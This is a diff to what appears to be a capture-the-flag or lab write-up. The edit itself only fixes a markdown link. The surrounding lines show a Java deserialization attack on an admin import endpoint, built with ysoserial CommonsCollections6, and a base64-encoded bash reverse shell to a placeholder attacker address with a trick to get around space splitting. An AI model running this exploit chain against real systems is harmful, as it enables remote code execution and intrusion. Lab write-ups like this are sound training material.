@@ -137,7 +137,7 @@ curl -s -X POST http://<TARGET_IP>:8080/admin/import --cookie "JSESSIONID=$COOKI
 ![Alt text](./img/serialization_poc.png)
 This command returns Batch accepted, so we know it works.
 
-From the *pom.xml* we read at the beginning we know, that the service uses obsolete version of CommonsCollections 3.2.2. using (ysoserial)[https://github.com/frohoff/ysoserial] CommonsCollections6, we craft a serialized payload. Ysoserial splits the payload on space character, so we need to bypass this.
+From the *pom.xml* we read at the beginning we know, that the service uses obsolete version of CommonsCollections 3.2.2. using [ysoserial](https://github.com/frohoff/ysoserial) CommonsCollections6, we craft a serialized payload. Ysoserial splits the payload on space character, so we need to bypass this.
 ```bash
 shell=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' | base64) # bypass space splitting
 payload=$(java --add-opens java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,$shell}|{base64,-d}|{bash,-i}" | base64 -w0)
